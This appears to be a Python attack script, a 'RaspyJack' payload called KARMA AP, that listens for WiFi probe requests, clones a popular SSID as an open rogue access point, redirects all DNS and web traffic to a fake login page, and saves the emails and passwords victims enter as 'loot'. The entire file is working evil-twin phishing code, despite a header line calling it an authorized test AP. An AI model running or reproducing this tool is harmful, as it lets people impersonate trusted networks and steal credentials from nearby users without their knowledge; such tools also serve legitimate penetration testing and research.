#!/usr/bin/env python3
# @name: KARMA AP
# @desc: Observe probe-request SSIDs, let the operator select one, then create an authorized test AP and captive portal using that SSID.
# @category: wifi
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- KARMA AP
===============================
Author: 7h30th3r0n3

Monitor WiFi probe requests to discover SSIDs that nearby devices
are searching for, then create a rogue AP using the most-probed SSID
to lure clients.

Setup / Prerequisites
---------------------
- USB WiFi dongle with monitor mode support (e.g. Alfa AWUS036ACH)
- apt install hostapd dnsmasq-base tcpdump
- Dongle is auto-detected on wlan1+ (onboard wlan0 is reserved for WebUI)

Steps:
  1) Monitor probe requests on USB dongle (monitor mode)
  2) Collect and rank probed SSIDs
  3) Launch hostapd cloning the top SSID
  4) Serve DHCP + DNS redirect + captive portal

Controls:
  python3 karma_ap.py [interface] [monitor_seconds]
    interface       -- WiFi interface to use (optional; auto-detected or
                        prompted for if omitted / ambiguous)
    monitor_seconds  -- how long to listen for probe requests before
                         prompting for a target SSID (default 30)

  During the run:
    - Probed SSIDs are printed periodically while monitoring.
    - After monitoring, choose the SSID to clone from a numbered list
      (or pick a captive portal page if any are available).
    - Once the rogue AP is live, status (clients / captured creds) is
      printed periodically. Press Ctrl-C to stop and clean up.

Loot: $CITYPOP_ROOT/loot/KarmaAP/
"""

from payloads._web_input import request_input
import os
import sys
import re
import json
import time
import signal
import threading
import subprocess
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_interfaces, supports_monitor

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'KarmaAP')
os.makedirs(LOOT_DIR, exist_ok=True)

HOSTAPD_CONF = "/tmp/raspyjack_karma_hostapd.conf"
DNSMASQ_CONF = "/tmp/raspyjack_karma_dnsmasq.conf"
PORTAL_PORT = 80
GATEWAY_IP = "10.0.77.1"
DHCP_RANGE_START = "10.0.77.10"
DHCP_RANGE_END = "10.0.77.250"

# ---------------------------------------------------------------------------
# WiFi helpers
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_usb_wifi():
    """Find first WiFi interface with monitor mode support."""
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if not supports_monitor(name):
                continue
            return name
    except Exception:
        pass
    return None


def _select_interface_cli(iface_type="wifi"):
    """Detect interfaces and let the operator pick one via stdin.

    Auto-selects if only one interface matches. Returns iface name or None.
    """
    ifaces = list_interfaces(iface_type)
    if not ifaces:
        print("No interface found!", flush=True)
        return None
    if len(ifaces) == 1:
        return ifaces[0]["name"]

    print("Available interfaces:", flush=True)
    for i, ifc in enumerate(ifaces):
        src = "USB" if not ifc["is_onboard"] else "onboard"
        caps = []
        if ifc["supports_ap"]:
            caps.append("AP")
        if ifc["supports_monitor"]:
            caps.append("mon")
        cap_str = f" [{'+'.join(caps)}]" if caps else ""
        print(f"  {i}) {ifc['name']} ({src}){cap_str}", flush=True)

    choice = request_input("Select interface number: ").strip()
    try:
        idx = int(choice)
        if 0 <= idx < len(ifaces):
            return ifaces[idx]["name"]
    except ValueError:
        pass
    print("Invalid selection.", flush=True)
    return None


def _set_monitor_mode(iface):
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "monitor"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _set_managed_mode(iface):
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "managed"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
probed_ssids = {}      # ssid -> count
monitoring = False
ap_running = False
status_msg = "Idle"
credentials = []
connected_clients = []

_monitor_proc = None
_hostapd_proc = None
_dnsmasq_proc = None
_portal_server = None
_iface = None

# ---------------------------------------------------------------------------
# Probe monitoring
# ---------------------------------------------------------------------------

def _probe_monitor_loop(iface):
    """Capture probe requests via tcpdump and extract SSIDs."""
    global _monitor_proc, monitoring

    _set_monitor_mode(iface)
    time.sleep(0.5)

    try:
        _monitor_proc = subprocess.Popen(
            ["sudo", "tcpdump", "-i", iface, "-e", "-l",
             "type", "mgt", "subtype", "probe-req"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            text=True, bufsize=1,
        )
    except Exception as exc:
        with lock:
            monitoring = False
        return

    ssid_pattern = re.compile(r"Probe Request \(([^)]+)\)")
    alt_pattern = re.compile(r"SSID=\[([^\]]+)\]")

    while True:
        with lock:
            if not monitoring:
                break

        try:
            line = _monitor_proc.stdout.readline()
        except Exception:
            break

        if not line:
            if _monitor_proc.poll() is not None:
                break
            continue

        ssid = None
        match = ssid_pattern.search(line)
        if match:
            ssid = match.group(1).strip()
        if not ssid:
            match = alt_pattern.search(line)
            if match:
                ssid = match.group(1).strip()

        if ssid and ssid != "Broadcast" and len(ssid) > 0:
            with lock:
                probed_ssids[ssid] = probed_ssids.get(ssid, 0) + 1


def start_monitoring():
    """Start probe request monitoring."""
    global monitoring, status_msg
    if not _iface:
        with lock:
            status_msg = "No USB WiFi"
        return
    with lock:
        if monitoring:
            return
        monitoring = True
        status_msg = "Monitoring probes..."
    threading.Thread(target=_probe_monitor_loop, args=(_iface,), daemon=True).start()


def stop_monitoring():
    """Stop probe monitoring."""
    global monitoring, _monitor_proc, status_msg
    with lock:
        monitoring = False
    if _monitor_proc is not None:
        try:
            _monitor_proc.terminate()
            _monitor_proc.wait(timeout=3)
        except Exception:
            try:
                _monitor_proc.kill()
            except Exception:
                pass
        _monitor_proc = None
    with lock:
        status_msg = f"Stopped. {len(probed_ssids)} SSIDs"


# ---------------------------------------------------------------------------
# Sorted SSID list
# ---------------------------------------------------------------------------

def _get_sorted_ssids():
    """Return list of (ssid, count) sorted by count descending."""
    with lock:
        items = list(probed_ssids.items())
    items.sort(key=lambda x: x[1], reverse=True)
    return items


# ---------------------------------------------------------------------------
# AP launch
# ---------------------------------------------------------------------------

PORTAL_HTML_DEFAULT = """<!DOCTYPE html>
<html><head><title>WiFi Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:sans-serif;background:#eee;display:flex;
justify-content:center;align-items:center;min-height:100vh;margin:0}
.c{background:#fff;padding:28px;border-radius:8px;box-shadow:0 2px 8px
rgba(0,0,0,.12);max-width:340px;width:90%}
h2{margin-top:0;color:#222}
input{width:100%;padding:10px;margin:6px 0;border:1px solid #bbb;
border-radius:4px;box-sizing:border-box}
button{width:100%;padding:11px;background:#007bff;color:#fff;border:none;
border-radius:4px;cursor:pointer;font-size:15px}
</style></head>
<body><div class="c">
<h2>Network Login</h2>
<form method="POST" action="/login">
<input name="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>"""

PORTAL_SITES_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'DNSSpoof', 'sites')
selected_portal_path = None  # None = use built-in default


def _list_portal_pages():
    """Return list of available portal page directory names."""
    if not os.path.isdir(PORTAL_SITES_DIR):
        return []
    entries = []
    try:
        for name in sorted(os.listdir(PORTAL_SITES_DIR)):
            full = os.path.join(PORTAL_SITES_DIR, name)
            if os.path.isdir(full):
                entries.append(name)
    except Exception:
        pass
    return entries


def _load_portal_html(page_name):
    """Load index.html from a portal page directory. Returns HTML string or None."""
    if not page_name:
        return None
    for candidate in ("index.html", "index.htm"):
        path = os.path.join(PORTAL_SITES_DIR, page_name, candidate)
        if os.path.isfile(path):
            try:
                with open(path, "r", errors="replace") as fh:
                    return fh.read()
            except Exception:
                pass
    return None


def _select_portal_page():
    """Interactive portal page selector via stdin. Returns page name or None."""
    pages = _list_portal_pages()
    if not pages:
        return None

    print("Available captive portal pages:", flush=True)
    print("  0) [Default]", flush=True)
    for i, name in enumerate(pages, start=1):
        print(f"  {i}) {name}", flush=True)

    choice = request_input("Select portal page number [0]: ").strip()
    if not choice:
        return None
    try:
        idx = int(choice)
        if idx == 0:
            return None
        if 1 <= idx <= len(pages):
            return pages[idx - 1]
    except ValueError:
        pass
    print("Invalid selection, using default.", flush=True)
    return None


def _get_portal_html():
    """Return the HTML to serve based on selected portal page."""
    if selected_portal_path:
        html = _load_portal_html(selected_portal_path)
        if html:
            return html
    return PORTAL_HTML_DEFAULT


class _PortalHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(_get_portal_html().encode())

    def do_POST(self):
        clen = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(clen).decode("utf-8", errors="replace")
        params = parse_qs(body)
        email = params.get("email", [""])[0]
        password = params.get("password", [""])[0]
        if email or password:
            cred = {
                "timestamp": datetime.now().isoformat(),
                "email": email,
                "password": password,
                "ip": self.client_address[0],
            }
            with lock:
                credentials.append(cred)
            _save_cred(cred)
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h2>Connected!</h2></body></html>")


def _save_cred(cred):
    ts = datetime.now().strftime("%Y%m%d")
    path = os.path.join(LOOT_DIR, f"karma_creds_{ts}.json")
    existing = []
    if os.path.isfile(path):
        try:
            with open(path, "r") as f:
                existing = json.load(f)
        except Exception:
            existing = []
    existing.append(cred)
    with open(path, "w") as f:
        json.dump(existing, f, indent=2)


def _portal_loop():
    while True:
        with lock:
            if not ap_running:
                break
        try:
            if _portal_server:
                _portal_server.handle_request()
        except Exception:
            break


def _start_ap(ssid):
    """Launch rogue AP with given SSID."""
    global _hostapd_proc, _dnsmasq_proc, _portal_server
    global ap_running, status_msg

    iface = _iface
    if not iface:
        with lock:
            status_msg = "No USB WiFi"
        return

    stop_monitoring()
    time.sleep(0.3)

    with lock:
        status_msg = f"Starting AP: {ssid[:12]}"

    _set_managed_mode(iface)
    time.sleep(0.5)

    subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface],
                   capture_output=True, timeout=5)
    subprocess.run(
        ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface],
        capture_output=True, timeout=5,
    )
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)

    # hostapd config
    with open(HOSTAPD_CONF, "w") as f:
        f.write(
            f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
            f"hw_mode=g\nchannel=6\nwmm_enabled=0\n"
            f"auth_algs=1\nwpa=0\n"
        )

    # dnsmasq config
    with open(DNSMASQ_CONF, "w") as f:
        f.write(
            f"interface={iface}\n"
            f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},12h\n"
            f"dhcp-option=3,{GATEWAY_IP}\n"
            f"dhcp-option=6,{GATEWAY_IP}\n"
            f"address=/#/{GATEWAY_IP}\n"
            f"no-resolv\n"
        )

    for proc_name in ("hostapd", "dnsmasq"):
        subprocess.run(["sudo", "killall", proc_name],
                       capture_output=True, timeout=5)
    time.sleep(0.3)

    _hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", HOSTAPD_CONF],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(1.5)
    if _hostapd_proc.poll() is not None:
        with lock:
            status_msg = "hostapd failed"
        return

    _dnsmasq_proc = subprocess.Popen(
        ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "-d"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(0.5)

    # iptables
    for cmd in [
        ["sudo", "iptables", "-t", "nat", "-F"],
        ["sudo", "iptables", "-F"],
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", iface, "-p", "tcp", "--dport", "80",
         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", iface, "-p", "udp", "--dport", "53",
         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:53"],
        ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
         "-j", "MASQUERADE"],
        ["sudo", "sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)

    try:
        _portal_server = HTTPServer(("0.0.0.0", PORTAL_PORT), _PortalHandler)
        _portal_server.timeout = 1
        with lock:
            ap_running = True
        threading.Thread(target=_portal_loop, daemon=True).start()
    except OSError as exc:
        with lock:
            status_msg = f"Portal err: {str(exc)[:16]}"
        return

    with lock:
        status_msg = f"AP live: {ssid[:14]}"

    # Save probed SSIDs to loot
    _save_probes()


def _save_probes():
    """Export probed SSIDs to loot."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"probes_{ts}.json")
    with lock:
        data = dict(probed_ssids)
    with open(path, "w") as f:
        json.dump(data, f, indent=2)


def _stop_ap():
    """Stop AP and clean up all processes."""
    global _hostapd_proc, _dnsmasq_proc, _portal_server, ap_running, status_msg

    with lock:
        ap_running = False

    if _hostapd_proc:
        try:
            _hostapd_proc.terminate()
            _hostapd_proc.wait(timeout=3)
        except Exception:
            try:
                _hostapd_proc.kill()
            except Exception:
                pass
        _hostapd_proc = None

    if _dnsmasq_proc:
        try:
            _dnsmasq_proc.terminate()
            _dnsmasq_proc.wait(timeout=3)
        except Exception:
            try:
                _dnsmasq_proc.kill()
            except Exception:
                pass
        _dnsmasq_proc = None

    for proc_name in ("hostapd", "dnsmasq"):
        subprocess.run(["sudo", "killall", "-9", proc_name],
                       capture_output=True, timeout=5)

    if _portal_server:
        try:
            _portal_server.server_close()
        except Exception:
            pass
        _portal_server = None

    # iptables cleanup
    for cmd in [
        ["sudo", "iptables", "-t", "nat", "-F"],
        ["sudo", "iptables", "-F"],
        ["sudo", "sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"],
    ]:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass

    if _iface:
        _set_managed_mode(_iface)
        subprocess.run(["sudo", "ip", "addr", "flush", "dev", _iface],
                       capture_output=True, timeout=5)

    for fpath in (HOSTAPD_CONF, DNSMASQ_CONF):
        try:
            os.remove(fpath)
        except OSError:
            pass

    with lock:
        status_msg = "AP stopped"


# ---------------------------------------------------------------------------
# Client listing
# ---------------------------------------------------------------------------

def _get_connected_clients():
    """Parse dnsmasq leases for connected clients."""
    clients = []
    lease_file = "/var/lib/misc/dnsmasq.leases"
    try:
        if os.path.isfile(lease_file):
            with open(lease_file, "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 4:
                        clients.append({
                            "mac": parts[1],
                            "ip": parts[2],
                            "hostname": parts[3] if len(parts) > 3 else "?",
                        })
    except Exception:
        pass
    return clients


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _iface, status_msg, selected_portal_path

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        print("Usage: karma_ap.py [interface] [monitor_seconds]", flush=True)
        return 0

    iface_arg = args[0] if len(args) >= 1 else None
    duration_arg = args[1] if len(args) >= 2 else None

    _iface = iface_arg if iface_arg else _select_interface_cli(iface_type="wifi")
    if not _iface:
        print("No usable WiFi interface, aborting.", flush=True)
        return 1

    try:
        monitor_seconds = int(duration_arg) if duration_arg else 30
    except ValueError:
        monitor_seconds = 30

    print("KARMA AP -- capture probe requests & create rogue AP", flush=True)
    print(f"Interface: {_iface}", flush=True)
    print(f"Monitoring probe requests for {monitor_seconds}s ...", flush=True)

    try:
        start_monitoring()
        start = time.time()
        last_print = -1
        while time.time() - start < monitor_seconds:
            time.sleep(1)
            elapsed = int(time.time() - start)
            if elapsed != last_print and elapsed % 5 == 0:
                last_print = elapsed
                ssids = _get_sorted_ssids()
                top = f"{ssids[0][0]} ({ssids[0][1]})" if ssids else "none yet"
                print(f"  [{elapsed}s] {len(ssids)} SSIDs probed, top: {top}", flush=True)
        stop_monitoring()

        ssids = _get_sorted_ssids()
        if not ssids:
            print("No probe requests captured. Exiting.", flush=True)
            return 0

        print("\nProbed SSIDs (by popularity):", flush=True)
        for i, (ssid, count) in enumerate(ssids[:20]):
            print(f"  {i}) {ssid} ({count})", flush=True)

        choice = request_input(f"Select SSID to clone [0={ssids[0][0]}], or 'q' to quit: ").strip()
        if choice.lower() == "q":
            print("Aborted by operator.", flush=True)
            return 0
        try:
            idx = int(choice) if choice else 0
            if not (0 <= idx < len(ssids)):
                idx = 0
        except ValueError:
            idx = 0
        target_ssid = ssids[idx][0]

        selected_portal_path = _select_portal_page()

        print(f"Launching rogue AP with SSID '{target_ssid}' ...", flush=True)
        _start_ap(target_ssid)
        with lock:
            msg = status_msg
            running = ap_running
        print(msg, flush=True)
        if not running:
            print("AP failed to start.", flush=True)
            return 1

        print(f"Access point: {target_ssid} · Interface: {_iface}", flush=True)
        print(f"Portal address after joining the AP: http://{GATEWAY_IP}:{PORTAL_PORT}/", flush=True)
        print(f"Loot directory: {LOOT_DIR} · Press Stop to end.", flush=True)
        last_cred_count = 0
        while True:
            time.sleep(3)
            clients = _get_connected_clients()
            with lock:
                cred_count = len(credentials)
            if cred_count != last_cred_count:
                last_cred_count = cred_count
                print(f"  New credentials captured (total {cred_count})", flush=True)
            print(f"  status: clients={len(clients)} creds={cred_count}", flush=True)

    except KeyboardInterrupt:
        print("\nStopping...", flush=True)
    finally:
        stop_monitoring()
        _stop_ap()
        with lock:
            cred_count = len(credentials)
            probe_count = len(probed_ssids)
        print(f"Summary: {probe_count} SSIDs probed, {cred_count} credentials captured.", flush=True)
        print(f"Loot saved under {LOOT_DIR}", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
